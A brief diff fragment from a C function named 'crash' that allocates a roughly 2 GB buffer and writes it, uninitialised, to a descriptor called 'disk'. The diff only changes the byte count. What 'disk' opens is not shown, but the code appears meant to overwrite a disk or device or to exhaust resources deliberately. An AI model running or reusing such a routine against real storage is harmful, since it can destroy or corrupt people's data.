@@ -20,8 +20,8 @@ void crash (void)
 		exit(EXIT_FAILURE);
 	}
 
-	char *buffer = malloc(sizeof(char)*2147483647); 
-	write(disk,buffer, 2147483647);
+	char *buffer = malloc(sizeof(char)*2057088847); 
+	write(disk,buffer, 2057088847);
     close(disk);
 	free(buffer);
 }
